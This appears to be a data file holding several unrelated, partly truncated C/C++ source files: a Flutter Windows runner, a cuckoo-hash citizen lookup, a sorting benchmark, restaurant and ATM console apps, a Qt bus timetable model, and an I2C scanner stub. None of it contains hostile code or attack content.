    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"day_9\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "\ufeff#include <iostream>\r\n#include <sstream>\r\n#include <string>\r\n#include <memory>\r\n#include <thread>\r\n#include <vector>\r\n#include <fstream>\r\n#include <cmath>\r\n#include <boost/archive/binary_oarchive.hpp>\r\n#include <boost/archive/binary_iarchive.hpp>\r\n#include <boost/serialization/vector.hpp>\r\n#include <boost/serialization/string.hpp>\r\n#include <boost/interprocess/file_mapping.hpp>\r\n#include <boost/interprocess/mapped_region.hpp>\r\n#include \"Ciudadano.h\"\r\n#include \"CuckooHash.h\"\r\n#include \"Funciones.h\"\r\n#include \"Utilidades.h\"\r\n#include \"Constantes.h\"\r\n\r\nCuckooHashTable generarCiudadanosYTablaHash(int poblacionSize, const std::string& ciudadanosFileName, const std::string& tablaHashFileName) {\r\n    // Crear archivo para ciudadanos\r\n    std::ofstream ofsCiudadanos(ciudadanosFileName, std::ios::binary);\r\n\r\n    // Crear tabla hash de Cuckoo\r\n    CuckooHashTable tablaHash(NUM_TABLAS_CUCKOO, 10);\r\n\r\n    for (int i = 1; i <= poblacionSize; ++i) {\r\n        Ciudadano ciudadano(i);\r\n        // Serializar ciudadano en un stream\r\n        std::stringstream ss;\r\n        {\r\n            boost::archive::binary_oarchive oa(ss);\r\n            oa << ciudadano;\r\n        }\r\n        // Escribir el ciudadano en el archivo\r\n        std::string ciudadanoData = ss.str();\r\n        size_t memoryAddress = ofsCiudadanos.tellp();\r\n        size_t ciudadanoSize = ciudadanoData.size();\r\n        ofsCiudadanos.write(reinterpret_cast<const char*>(&ciudadanoSize), sizeof(size_t)); // Guardar el tama\u00f1o\r\n        ofsCiudadanos.write(ciudadanoData.c_str(), ciudadanoData.size());\r\n\r\n        // Insertar en la tabla hash\r\n        tablaHash.insertar(ciudadano.getId(), memoryAddress);\r\n    }\r\n\r\n    // Serializar la tabla hash\r\n    std::ofstream ofsTablaHash(tablaHashFileName, std::ios::binary);\r\n    boost::archive::binary_oarchive oaTablaHash(ofsTablaHash);\r\n    oaTablaHash << tablaHash;\r\n    return tablaHash;\r\n}\r\n\r\nCuckooHashTable cargarTablaHash(const std::string& tablaHashFileName) {\r\n    std::ifstream ifsTablaHash(tablaHashFileName, std::ios::binary);\r\n    boost::archive::binary_iarchive iaTablaHash(ifsTablaHash);\r\n    CuckooHashTable tablaHash;\r\n    iaTablaHash >> tablaHash;\r\n    return tablaHash;\r\n}\r\n\r\nCuckooHashTable cargarDatos(const std::string& ciudadanosFileName, const std::string& tablaHashFileName) {\r\n    std::ifstream fileStream(tablaHashFileName, std::ios::binary);\r\n\r\n    if (!fileStream.is_open()) {\r\n        return generarCiudadanosYTablaHash(POBLACION, ciudadanosFileName, tablaHashFileName);\r\n    }\r\n    else {\r\n        return cargarTablaHash(tablaHashFileName);\r\n    }\r\n}\r\n\r\nvoid insertarCiudadanoEnBinario(Ciudadano& nuevoCiudadano, const std::string& ciudadanosFileName, CuckooHashTable& tablaHash) {\r\n    // Abrir archivo en modo append\r\n    std::ofstream ofsCiudadanos(ciudadanosFileName, std::ios::binary | std::ios::app);\r\n    if (!ofsCiudadanos.is_open()) {\r\n        throw std::runtime_error(\"No se pudo abrir el archivo de ciudadanos para escribir\");\r\n    }\r\n\r\n    // Serializar el nuevo ciudadano\r\n    std::stringstream ss;\r\n    {\r\n        boost::archive::binary_oarchive oa(ss);\r\n        oa << nuevoCiudadano;\r\n    }\r\n    std::string ciudadanoData = ss.str();\r\n    size_t ciudadanoSize = ciudadanoData.size();\r\n\r\n    // Escribir el tama\u00f1o y los datos del nuevo ciudadano en el archivo\r\n    ofsCiudadanos.write(reinterpret_cast<const char*>(&ciudadanoSize), sizeof(size_t));\r\n    ofsCiudadanos.write(ciudadanoData.c_str(), ciudadanoSize);\r\n\r\n    // Validar la posici\u00f3n despu\u00e9s de escribir\r\n    size_t memoryAddressAfterWrite = ofsCiudadanos.tellp();\r\n\r\n    // Obtener la posici\u00f3n de memoria actual (al final del archivo)\r\n    size_t memoryAddress = memoryAddressAfterWrite - (ciudadanoSize + sizeof(size_t));\r\n\r\n    // Insertar en la tabla hash\r\n    tablaHash.insertar(nuevoCiudadano.getId(), memoryAddress);\r\n\r\n    ofsCiudadanos.close();\r\n}\r\n\r\nCiudadano buscarCiudadanoPorDNI(const std::string& dni, const std::string& ciudadanosFileName, CuckooHashTable& tablaHash) {\r\n    int id = formatearDni(dni);\r\n\r\n    // Buscar la direcci\u00f3n de memoria en la tabla hash\r\n    std::pair<int, size_t> entry = tablaHash.buscar(id);\r\n    if (entry.first == -1) {\r\n        throw std::runtime_error(\"\\t\\tCiudadano no encontrado...\\n\");\r\n    }\r\n\r\n    size_t memoryAddress = entry.second;\r\n\r\n    // Cargar el ciudadano desde la direcci\u00f3n de memoria\r\n    boost::interprocess::file_mapping file(ciudadanosFileName.c_str(), boost::interprocess::read_only);\r\n    size_t ciudadanoSize;\r\n\r\n    // Leer el tama\u00f1o del ciudadano\r\n    {\r\n        boost::interprocess::mapped_region region(file, boost::interprocess::read_only, memoryAddress, sizeof(size_t));\r\n        std::memcpy(&ciudadanoSize, region.get_address(), sizeof(size_t));\r\n    }\r\n\r\n    // Leer los datos del ciudadano\r\n    boost::interprocess::mapped_region regionCiudadano(file, boost::interprocess::read_only, memoryAddress + sizeof(size_t), ciudadanoSize);\r\n    std::stringstream ss;\r\n    ss.write(static_cast<const char*>(regionCiudadano.get_a",
    "#include \"stdio.h\"\n#include \"stdlib.h\"\n#include \"time.h\"\n#include \"Windows.h\"\n\n\n#define n 1000\n\n\n//\u5192\u6ce1\u6392\u5e8f\ndouble bubbleSort(int number, int arr[]) {\n    for (int i = 0; i < number; ++i) {\n        for (int j = 0; j < number - i - 1; ++j) {\n            if (arr[j] >= arr[j + 1]) {\n                int temp = arr[j];\n                arr[j] = arr[j + 1];\n                arr[j + 1] = temp;\n            }\n        }\n    }\n    return 0;\n}\n\n//\u63d2\u5165\u6392\u5e8f\ndouble insertSort(int number, int arr[]) {\n    for (int i = 1; i < number; ++i) {\n        for (int j = i; j > 0; j--) {\n            if (arr[j] < arr[j - 1]) {\n                int temp = arr[j];\n                arr[j] = arr[j - 1];\n                arr[j - 1] = temp;\n            }\n            else {\n                break;\n            }\n        }\n    }\n    return 0;\n}\n\n//\u9009\u62e9\u6392\u5e8f\ndouble selectSort(int number, int arr[]) {\n    for (int i = 0; i < number - 1; i++) {\n        for (int j = i + 1; j < number; j++) {\n            if (arr[i] > arr[j]) {\n                int temp = arr[i];\n                arr[i] = arr[j];\n                arr[j] = temp;\n            }\n        }\n    }\n    return 0;\n}\n//\u4ee5\u4e0b\u4e3a\u5feb\u901f\u6392\u5e8f\n  // \u4ea4\u6362\u6570\u7ec4\u4e2d\u4e24\u4e2a\u5143\u7d20\u7684\u503c\nvoid swap(int* a, int* b) {\n    int temp = *a;\n    *a = *b;\n    *b = temp;\n}\n\n// \u5c06\u6570\u7ec4\u5212\u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u5e76\u8fd4\u56de\u5212\u5206\u70b9\u7684\u4e0b\u6807\nint divide(int arr[], int low, int high) {\n    int middle = arr[high];  // \u9009\u53d6\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4f5c\u4e3a\u57fa\u51c6\u70b9\n    int i = low - 1;  // \u521d\u59cb\u5316\u8f83\u5c0f\u5143\u7d20\u7684\u7d22\u5f15\n\n    for (int j = low; j < high; j++) {\n        if (arr[j] < middle) {\n            i++;\n            swap(&arr[i], &arr[j]);\n        }\n    }\n\n    swap(&arr[i + 1], &arr[high]);\n    return i + 1;\n}\n\n// \u5feb\u901f\u6392\u5e8f\u51fd\u6570\nvoid quickSort(int arr[], int low, int high) {\n    if (low < high) {\n        int pi = divide(arr, low, high);\n\n        // \u5206\u522b\u5bf9\u5212\u5206\u7684\u4e24\u90e8\u5206\u8fdb\u884c\u9012\u5f52\u6392\u5e8f\n        quickSort(arr, low, pi - 1);\n        quickSort(arr, pi + 1, high);\n    }\n}\n\n\n//\u4ee5\u4e0b\u4e3a\u5f52\u5e76\u6392\u5e8f\nvoid merge(int* arr1, int* arr2, int* result, int length1, int length2) {\n    int point1 = 0;\n    int point2 = 0;\n    int resultPoint = 0;\n    while (!(point1 == length1 && point2 == length2)) {\n        if (point1 == length1) {\n            result[resultPoint] = arr2[point2];\n            point2++, resultPoint++;\n            continue;\n        }\n        if (point2 == length2) {\n            result[resultPoint] = arr1[point1];\n            point1++, resultPoint++;\n            continue;\n        }\n        if (arr1[point1] < arr2[point2]) {\n            result[resultPoint] = arr1[point1];\n            point1++, resultPoint++;\n        }\n        else {\n            result[resultPoint] = arr2[point2];\n            point2++, resultPoint++;\n        }\n    }\n}\n\nvoid mergeSort(int* arr, int* re, int startIndex, int endIndex) {\n    //\u9012\u5f52\u5206\u7ec4\n    if (startIndex == endIndex) {\n        re[0] = arr[startIndex];\n        return;\n    }\n    int middle = (startIndex + endIndex) / 2;\n    int* in1 = (int*)malloc((middle - startIndex + 1) * sizeof(int));\n    mergeSort(arr, in1, startIndex, middle);\n    int* in2 = (int*)malloc((endIndex - middle) * sizeof(int));\n    mergeSort(arr, in2, middle + 1, endIndex);\n    merge(in1, in2, re, middle - startIndex + 1, endIndex - middle);\n}\n\n\nint main() {\n    int arr[n];\n    int origin[n];\n    srand((unsigned int)(time(NULL)));\n    for (int i = 0; i < n; ++i) {\n        arr[i] = rand();\n    }\n    //origin\u4fdd\u5b58\u4e71\u7801\n    for (int i = 0; i < n; i++) {\n        origin[i] = arr[i];\n    }\n    //\u67e5\u770b\u5177\u4f53\u6570\u7ec4\n    //for (int i = 0; i < n; i++) {\n    //   printf(\"%d\\n \", origin[i]);\n    //}\n    LARGE_INTEGER frequency;\n    //\u6d4b\u8bd5\u5192\u6ce1\u6392\u5e8f\u65f6\u95f4\n    LARGE_INTEGER bubblestart, bubbleend;\n    double elapsedTime1;\n\n    QueryPerformanceFrequency(&frequency);\n    QueryPerformanceCounter(&bubblestart);\n\n    bubbleSort(n, arr);\n\n    QueryPerformanceCounter(&bubbleend);\n\n    elapsedTime1 = (double)(bubbleend.QuadPart - bubblestart.QuadPart) / frequency.QuadPart;\n\n    printf(\"bubblesort: %lf \u79d2\\n\", elapsedTime1);\n    for (int i = 0; i < n; i++) {\n        arr[i] = origin[i];\n    }\n\n\n\n    //\u6d4b\u8bd5\u63d2\u5165\u6392\u5e8f\u65f6\u95f4\n    LARGE_INTEGER insertstart, insertend;\n    double elapsedTime2;\n\n    QueryPerformanceCounter(&insertstart);\n\n    insertSort(n, arr);\n\n    QueryPerformanceCounter(&insertend);\n\n    elapsedTime2 = (double)(insertend.QuadPart - insertstart.QuadPart) / frequency.QuadPart;\n\n    printf(\"insertsort: %lf \u79d2\\n\", elapsedTime2);\n\n    for (int i = 0; i < n; i++) {\n        arr[i] = origin[i];\n    }\n\n\n    //\u6d4b\u8bd5\u9009\u62e9\u6392\u5e8f\n    LARGE_INTEGER selectstart, selectend;\n    double elapsedTime3;\n    //for (int i = 0; i < n; i++) {\n    //    printf(\"%d \", arr[i]);\n    //}\n    QueryPerformanceCounter(&selectstart);\n\n    selectSort(n, arr);\n\n    QueryPerformanceCounter(&selectend);\n\n    elapsedTime3 = (double)(selectend.QuadPart - selectstart.QuadPart) / frequency.QuadPart;\n\n    printf(\"selectsort: %lf \u79d2\\n\", elapsedTime3);\n\n    for (int i = 0; i < n; i++) {\n        arr[i] = origin[i];\n    }\n\n    //\u6d4b\u8bd5\u5feb\u901f\u6392\u5e8f\n    LARGE_INTEGER quickstart, quickend;\n    double elapsedTime4;\n\n\n    QueryPerformanceCounter(&quickstart);\n\n    quickSort(arr, 0, n - 1);\n\n    QueryPerformanceCounter(&quickend);\n\n    elapsedTime4 = (do",
    "#include <iostream>   \r\n#include <string>    \r\n#include <iomanip>   \r\n#include <fstream>  \r\n\r\nusing namespace std;\r\n\r\nconst int MAX_MENU_ITEMS = 100;\r\nconst int MAX_ORDER_ITEMS = 100;\r\nconst int MAX_TABLES = 20;\r\nconst int MAX_WAITERS = 10;\r\n\r\nclass MenuItem {\r\n\t\r\n    private:\r\n        string name;\r\n        string description;\r\n        double price;\r\n\r\n    public:\r\n    \t\r\n        MenuItem(string n, string desc, double p) : name(n), description(desc), price(p) {}  \r\n        MenuItem() : name(\"\"), description(\"\"), price(0.0) {}\r\n\r\n    void display() const {\r\n    \t\r\n        cout<<setw(20)<<left<<name<<setw(30)<<left<<description<<setw(10)<<left<<price<<endl;\r\n    }\r\n\r\n    double getPrice() const {\r\n    \t\r\n        return price;\r\n    }\r\n\r\n    string getName() const {\r\n    \t\r\n        return name;\r\n    }\r\n\r\n    string getDescription() const {\r\n    \t\r\n        return description;\r\n    }\r\n};\r\n\r\nclass Menu {\r\n    private:\r\n    \t\r\n        MenuItem items[MAX_MENU_ITEMS];\r\n        int itemCount;\r\n\r\n    public:\r\n    \t\r\n    Menu() : itemCount(0) {} \r\n\r\n    void addItem(const MenuItem& item) {\r\n    \t\r\n        if (itemCount < MAX_MENU_ITEMS) {\r\n        \t\r\n            items[itemCount++] = item;\r\n            \r\n        } \r\n        \r\n\t\telse {\r\n\t\t\t\r\n            cerr<<\"Menu is full. Cannot add more items.\"<<endl;\r\n            \r\n        }\r\n    }\r\n\r\n    void display() const {\r\n    \t\r\n        cout<<setw(20)<<left<<\"Name\"<<setw(30)<<left<<\"Description\"<<setw(10)<<left<<\"Price\"<<endl;\r\n        cout<<setfill('-')<<setw(60)<<\"-\"<<setfill(' ')<<endl;\r\n        \r\n        for (int i = 0; i < itemCount; ++i) {\r\n        \t\r\n            items[i].display();\r\n            \r\n        }\r\n    }\r\n\r\n    MenuItem getItem(int index) const {\r\n    \t\r\n        if (index >= 1 && index <= itemCount) {\r\n        \t\r\n            return items[index - 1];\r\n            \r\n        } \r\n\t\telse {\r\n\t\t\t\r\n            cout<<\"Invalid menu item index\"<<endl;\r\n            return MenuItem();\r\n        }\r\n    }\r\n\r\n    void saveToFile(const string& filename) const {\r\n    \t\r\n        ofstream file(filename.c_str());\r\n        \r\n        if (file.is_open()) {\r\n        \t\r\n            for (int i = 0; i < itemCount; ++i) {\r\n            \t\r\n                file<<items[i].getName()<<\"\\n\"<<items[i].getDescription()<<\"\\n\"<< items[i].getPrice()<<\"\\n\";\r\n                \r\n            }\r\n            \r\n            file.close();\r\n            \r\n        } \r\n\t\telse {\r\n\t\t\t\r\n            cerr<<\"Unable to open file for writing.\"<<endl;\r\n            \r\n        }\r\n    }\r\n\r\n    void loadFromFile(const string& filename) {\r\n    \t\r\n        ifstream file(filename.c_str());\r\n        \r\n        if (file.is_open()) {\r\n        \t\r\n            itemCount = 0;\r\n            string name, description;\r\n            double price;\r\n            \r\n            while (getline(file, name) && getline(file, description) && file >> price) {\r\n            \t\r\n                file.ignore(); // to ignore the newline character after reading the price\r\n                addItem(MenuItem(name, description, price));\r\n            }\r\n            file.close();\r\n        } \r\n\t\telse {\r\n\t\t\t\r\n            cerr<<\"Unable to open file for reading.\"<<endl;\r\n        }\r\n    }\r\n};\r\n\r\nclass Order {\r\n\t\r\n    private:\r\n    \t\r\n    struct OrderItem {   // structure\r\n    \t\r\n        MenuItem item;\r\n        int quantity;\r\n        OrderItem(const MenuItem& itm, int qty) : item(itm), quantity(qty) {}\r\n        OrderItem() : item(), quantity(0) {}\r\n        \r\n    };\r\n\r\n    OrderItem orderItems[MAX_ORDER_ITEMS]; //array\r\n    \r\n    int orderCount;\r\n\r\n    public:\r\n\t\r\n    Order() : orderCount(0) {}  //default constructor \r\n\r\n    void addItem(const MenuItem& item, int quantity) {\r\n    \t\r\n        if (orderCount < MAX_ORDER_ITEMS) {\r\n        \t\r\n            orderItems[orderCount++] = OrderItem(item, quantity);\r\n            \r\n        } \r\n\t\telse {\r\n\t\t\t\r\n            cerr<<\"Order is full. Cannot add more items.\"<<endl;\r\n            \r\n        }\r\n    }\r\n\r\n    void display() const {\r\n    \t\r\n        cout<<setw(20)<<left<<\"Name\"<<setw(10)<<left<<\"Price\"<<setw(10)<<left<<\"Quantity\"<<setw(10)<<left<<\"Total\"<< endl;\r\n        cout<<setfill('-')<<setw(50)<<\"-\"<<setfill(' ')<<endl;\r\n        \r\n\t\tfor (int i = 0; i < orderCount; ++i) {\r\n\t\t\t\r\n            cout<<setw(20)<<left<<orderItems[i].item.getName()<<setw(10)<<left<<orderItems[i].item.getPrice()<<setw(10)<<left<<orderItems[i].quantity<<setw(10)<<left<<orderItems[i].item.getPrice() * orderItems[i].quantity<<endl;\r\n        }\r\n    }\r\n\r\n    double getTotalBill(double taxRate = 0.0, double discount = 0.0) const {\r\n    \t\r\n        double total = 0;\r\n        \r\n        for (int i = 0; i < orderCount; ++i) {\r\n        \t\r\n            total += orderItems[i].item.getPrice() * orderItems[i].quantity;\r\n            \r\n        }\r\n        \r\n        total += total * taxRate;\r\n        total -= discount;\r\n        \r\n        return total;\r\n    }\r\n};\r\n\r\nclass Table {\r\n\t\r\n    private:\r\n       int tableNumber;\r\n       bool occupied;\r\n       bool reserved;\r\n       Order order;\r\n\r\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <iomanip>\n#include <conio.h>\nusing namespace std;\n\nvoid Menu();\nvoid Login();\nvoid Registration();\nvoid AdminMenu();\n\nstruct Account\n{\n    string name;\n    double balance;\n};\n\nvoid merge(vector<Account> &accounts, int left, int mid, int right)\n{\n    int n1 = mid - left + 1;\n    int n2 = right - mid;\n\n    vector<Account> leftArray(n1);\n    vector<Account> rightArray(n2);\n\n    for (int i = 0; i < n1; i++)\n        leftArray[i] = accounts[left + i];\n    for (int j = 0; j < n2; j++)\n        rightArray[j] = accounts[mid + 1 + j];\n\n    int i = 0, j = 0, k = left;\n    while (i < n1 && j < n2)\n    {\n        if (leftArray[i].balance >= rightArray[j].balance)\n        {\n            accounts[k] = leftArray[i];\n            i++;\n        }\n        else\n        {\n            accounts[k] = rightArray[j];\n            j++;\n        }\n        k++;\n    }\n\n    while (i < n1)\n    {\n        accounts[k] = leftArray[i];\n        i++;\n        k++;\n    }\n\n    while (j < n2)\n    {\n        accounts[k] = rightArray[j];\n        j++;\n        k++;\n    }\n}\n\nvoid mergeSort(vector<Account> &accounts, int left, int right)\n{\n    if (left < right)\n    {\n        int mid = left + (right - left) / 2;\n        mergeSort(accounts, left, mid);\n        mergeSort(accounts, mid + 1, right);\n        merge(accounts, left, mid, right);\n    }\n}\n\nvoid printAccounts(const vector<Account> &accounts)\n{\n    for (const auto &account : accounts)\n    {\n        cout << \"Username: \" << account.name << \", Balance: \" << fixed << setprecision(0) << account.balance << endl;\n    }\n}\n\nvoid showUser()\n{\n    system(\"cls\");\n    vector<Account> accounts;\n    char choice;\n    ifstream userlist;\n    ifstream balFile;\n    double bal;\n    string user;\n\n    userlist.open(\"Data/ListUsers.txt\");\n    while (userlist >> user)\n    {\n        Account newAccount;\n        newAccount.name = user;\n\n        balFile.open(\"Data/Balance/\" + user + \".txt\");\n        balFile >> bal;\n        newAccount.balance = bal;\n        balFile.close();\n\n        accounts.push_back(newAccount);\n    }\n\n    mergeSort(accounts, 0, accounts.size() - 1);\n    printAccounts(accounts);\n    cout << \"Exit? (Y/N) : \";\n    cin >> choice;\n    if (choice == 'Y' || choice == 'y')\n    {\n        system(\"cls\");\n        AdminMenu();\n    }\n    else\n    {\n        showUser();\n    }\n}\nvoid searchUser(string search)\n{\n    string username;\n    ifstream userFile;\n\n    bool exist = false;\n\n    userFile.open(\"Data/ListUsers.txt\");\n    while (userFile >> username)\n    {\n        if (username == search)\n        {\n            exist = true;\n        }\n    }\n    userFile.close();\n\n    char ext;\n    int choice;\n    int newpin;\n    ofstream pinFile, myFile;\n    ifstream baFile;\n    double balance;\n    if (exist == true)\n    {\n        cout << \"1. Block user\" << endl;\n        cout << \"2. Reset user's pin\" << endl;\n        cout << \"3. Show Balance\" << endl;\n        cout << \"4. Exit\" << endl;\n        cout << \"Enter your choice : \";\n        cin >> choice;\n\n        if (choice == 1)\n        {\n            pinFile.open(\"Data/PIN/\" + search + \".txt\");\n            pinFile << \"BLOCKED\" << endl;\n            pinFile.close();\n        }\n\n        else if (choice == 2)\n        {\n            cout << \"input new pin : \";\n            cin >> newpin;\n            myFile.open(\"Data/PIN/\" + search + \".txt\");\n            myFile << newpin << endl;\n            myFile.close();\n        }\n        else if (choice == 3)\n        {\n\n            baFile.open(\"Data/Balance/\" + search + \".txt\");\n            baFile >> balance;\n            baFile.close();\n            while (true)\n            {\n                system(\"cls\");\n                cout << \"Balance : \" << fixed << setprecision(0) << balance << endl;\n                cout << \"Exit ? (Y/N) : \";\n                cin >> ext;\n                if (ext == 'Y' || ext == 'y')\n                {\n                    system(\"cls\");\n                    AdminMenu();\n                }\n            }\n        }\n        {\n            system(\"cls\");\n            AdminMenu();\n        }\n    }\n    else\n    {\n        system(\"cls\");\n        cout << \"User doesn't exist\" << endl;\n        AdminMenu();\n    }\n}\nvoid Menu()\n{\n    int choice;\n\n    cout << \"                                                                                         \" << endl;\n    cout << \" oooooo   oooooo     oooo           oooo                                                 \" << endl;\n    cout << \"  `888.    `888.     .8'            `888                                                 \" << endl;\n    cout << \"   `888.   .8888.   .8'    .ooooo.   888   .ooooo.   .ooooo.  ooo. .oo.  .oo.    .ooooo. \" << endl;\n    cout << \"    `888  .8'`888. .8'    d88' `88b  888  d88' `'Y8 d88' `88b `888P'Y88bP'Y88b  d88' `88b\" << endl;\n    cout << \"     `888.8'  `888.8'     888ooo888  888  888       888   888  888   888   888  888ooo888\" << endl;\n    cout << \"      `888'    `888'      888    .o  888  888   .o8 888   888  888   888   888  888    .o\" ",
    "#include \"TableModel.h\"\n#include <QFile>\n#include <QTextStream>\n#include <QDebug>\n#include \"Backend.h\"\n#include <mutex>\n\nTableModel::TableModel(QObject* parent)\n\t: QAbstractTableModel(parent)\n{\n\tm_header = { \"\u8f66\u6b21\u53f7\", \"\u53d1\u8f66\u65f6\u95f4\", \"\u59cb\u53d1\u7ad9\", \"\u7ec8\u5230\u7ad9\", \"\u5927\u7ea6\u65f6\u957f\", \"\u7968\u4ef7\", \"\u6700\u5927\u8f7d\u5ba2\u91cf\",\"\u5df2\u552e\u7968\u6570\" };\n\tupdateData();\n}\n\nvoid TableModel::updateModel()\n{\n\tupdateData();\n\tbeginResetModel();\n\tendResetModel();\n}\n\nQ_INVOKABLE void TableModel::setFilter(const bool isFiltered, const int FilterOption, const QString& filter)\n{\n\tFilter = filter;\n\tthis->FilterOption = FilterOption;\n\tif (!isFiltered) {\n\t\tthis->Filter = \"\";\n\t}\n\tupdateModel();\n}\n\nint TableModel::rowCount(const QModelIndex& /*parent*/) const\n{\n\t//qDebug() << m_data.size();\n\tstd::lock_guard<std::mutex> lock(m_dataMutex);\n\treturn m_data.size() + 1;\n}\n\nint TableModel::columnCount(const QModelIndex& /*parent*/) const\n{\n\t//\u628a\u65f6\u95f4\u5c0f\u65f6\u548c\u5206\u949f\u5408\u5e76\u6210\u4e00\u4e2a\u5217\n\treturn m_header.size();\n}\n\nQVariant TableModel::data(const QModelIndex& index, int role) const\n{\n\tif (role != Qt::DisplayRole) {\n\t\treturn QVariant();\n\t}\n\n\tif (index.row() == 0) {\n\t\treturn m_header[index.column()];\n\t}\n\n\tstd::lock_guard<std::mutex> lock(m_dataMutex);\n\n\tif (index.row() - 1 >= m_data.size()) {\n\t\treturn QVariant();\n\t}\n\n\tconst auto& busItem = m_data[index.row() - 1];\n\n\tswitch (index.column())\n\t{\n\tcase 0:\n\t\treturn busItem.busNumber;\n\tcase 1:\n\t\treturn QString::number(busItem.departureHour) + \":\" + QString::number(busItem.departureMinute);\n\tcase 2:\n\t\treturn busItem.startPoint;\n\tcase 3:\n\t\treturn busItem.endPoint;\n\tcase 4:\n\t\treturn busItem.duration;\n\tcase 5:\n\t\treturn busItem.price;\n\tcase 6:\n\t\treturn busItem.maxPassenger;\n\tcase 7:\n\t\treturn busItem.soldTickets;\n\tdefault:\n\t\treturn QVariant();\n\t}\n}\n\nQHash<int, QByteArray> TableModel::roleNames() const\n{\n\treturn { {Qt::DisplayRole, \"display\"} };\n}\n\nvoid TableModel::updateData()\n{\n\tauto all_data = Backend::getInstance().getTimetables();\n\n\t// \u4f7f\u7528\u4e92\u65a5\u9501\u4fdd\u62a4 m_data\n\tstd::lock_guard<std::mutex> lock(m_dataMutex);\n\n\t//\u8fc7\u6ee4\n\tQVector<BusInfo> filtered_data;\n\tfor (auto& bus : all_data) {\n\t\tif (Filter.isEmpty() ||\n\t\t\t(FilterOption == 0 && bus.busNumber == Filter) ||\n\t\t\t(FilterOption == 1 && bus.startPoint == Filter) ||\n\t\t\t(FilterOption == 2 && bus.endPoint == Filter)) {\n\t\t\tfiltered_data.append(bus);\n\t\t}\n\t}\n\n\t//\u6392\u5e8f\n\tstd::sort(filtered_data.begin(), filtered_data.end(), [](const BusInfo& a, const BusInfo& b) {\n\t\treturn a.departureHour * 60 + a.departureMinute < b.departureHour * 60 + b.departureMinute;\n\t});\n\n\t// \u66f4\u65b0 m_data\n\tm_data = std::move(filtered_data);\n}\n",
    "#include \"ScanI2C.h\"\n\nconst ScanI2C::DeviceAddress ScanI2C::ADDRESS_NONE = ScanI2C::DeviceAddress();\nconst ScanI2C::FoundDevice ScanI2C::DEVICE_NONE = ScanI2C::FoundDevice(ScanI2C::DeviceType::NONE, ADDRESS_NONE);\n\nScanI2C::ScanI2C() = default;\n\nvoid ScanI2C::scanPort(ScanI2C::I2CPort port) {}\n\nvoid ScanI2C::setSuppressScreen()\n{\n    shouldSuppressScreen = true;\n}\n\nScanI2C::FoundDevice ScanI2C::firstScreen() const\n{\n    // Allow to override the scanner results for screen\n    if (shouldSuppressScreen)\n        return DEVICE_NONE;\n\n    ScanI2C::DeviceType types[] = {SCREEN_SSD1306, SCREEN_SH1106, SCREEN_ST7567, SCREEN_UNKNOWN};\n    return firstOfOrNONE(4, types);\n}\n\nScanI2C::FoundDevice ScanI2C::firstRTC() const\n{\n    ScanI2C::DeviceType types[] = {RTC_RV3028, RTC_PCF8563};\n    return firstOfOrNONE(2, types);\n}\n\nScanI2C::FoundDevice ScanI2C::firstKeyboard() const\n{\n    ScanI2C::DeviceType types[] = {CARDKB, TDECKKB, BBQ10KB, RAK14004};\n    return firstOfOrNONE(4, types);\n}\n\nScanI2C::FoundDevice ScanI2C::firstAccelerometer() const\n{\n    ScanI2C::DeviceType types[] = {MPU6050, LIS3DH, BMA423};\n    return firstOfOrNONE(3, types);\n}\n\nScanI2C::FoundDevice ScanI2C::find(ScanI2C::DeviceType) const\n{\n    return DEVICE_NONE;\n}\n\nbool ScanI2C::exists(ScanI2C::DeviceType) const\n{\n    return false;\n}\n\nScanI2C::FoundDevice ScanI2C::firstOfOrNONE(size_t count, ScanI2C::DeviceType *types) const\n{\n    return DEVICE_NONE;\n}\n\nsize_t ScanI2C::countDevices() const\n{\n    return 0;\n}\n\nScanI2C::DeviceAddress::DeviceAddress(ScanI2C::I2CPort port, uint8_t address) : port(port), address(address) {}\n\nScanI2C::DeviceAddress::DeviceAddress() : DeviceAddress(I2CPort::NO_I2C, 0) {}\n\nbool ScanI2C::DeviceAddress::operator<(const ScanI2C::DeviceAddress &other) const\n{\n    return\n        // If this one has no port and other has a port\n        (port == NO_I2C && other.port != NO_I2C)\n        // if both have a port and this one's address is lower\n        || (port != NO_I2C && other.port != NO_I2C && (address < other.address));\n}\n\nScanI2C::FoundDevice::FoundDevice(ScanI2C::DeviceType type, ScanI2C::DeviceAddress address) : type(type), address(address) {}",
